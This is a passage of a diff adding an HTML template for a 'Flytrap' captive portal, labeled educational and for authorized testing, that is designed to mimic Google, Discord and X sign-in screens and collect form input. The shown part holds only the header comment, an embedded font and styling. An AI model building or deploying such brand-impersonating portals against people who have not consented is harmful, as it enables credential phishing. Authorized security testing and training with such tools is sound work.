@@ -1,0 +1,261 @@
+<!--
+  Flytrap portal template: "Social sign-in" captive portal.
+
+  EDUCATIONAL / AUTHORIZED-TESTING USE ONLY.
+  This is a SIMULATED sign-in page that mimics the look of social logins to
+  demonstrate how a captive portal collects form input. It is NOT affiliated
+  with or endorsed by Google, Discord, X, or any other brand, and contains no
+  real service integration. DO NOT ENTER REAL CREDENTIALS.
+
+  Only run on networks and devices you own or are explicitly authorized to test.
+  See the project's Responsible Use section.
+
+  One file, several screens: a picker sends the user to the respective brand
+  login page (Google / Discord / X). Fonts are embedded offline (subset of
+  Inter, OFL) - the page makes no network requests. {{SSID}} is replaced with
+  the configured network name before the page is served.
+-->
+<!doctype html><html lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><title>{{SSID}}</title>
+<style>
+@font-face{font-family:Inter;font-style:normal;font-weight:400 700;font-display:swap;src:url(data:font/woff2;base64,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) format('woff2')}
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+[hidden]{display:none!important}
+body{font-family:Inter,system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;background:#f2f3f5;color:#111;min-height:100vh;display:flex;align-items:flex-start;justify-content:center;padding:28px 18px;-webkit-font-smoothing:antialiased}
+@media(min-height:640px){body{align-items:center}}
+.screen{display:none;width:100%}.screen.on{display:block;animation:f .22s ease}
+@keyframes f{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+input{font-family:inherit}
+button{font-family:inherit;cursor:pointer}
+.back{display:inline-flex;align-items:center;gap:6px;background:none;border:none;color:#606770;font-size:13.5px;font-weight:600;cursor:pointer;padding:0;margin-bottom:14px}
+.back:hover{color:#111}
+.edu{display:block;color:#8a5a00;font-weight:600;font-size:11.5px;text-align:center;margin-top:20px;line-height:1.6}
+.edu a{color:#8a5a00}
+.edu .lk{color:#606770;text-decoration:underline;cursor:pointer;font-weight:500}
+
+/* ---------- Picker ---------- */
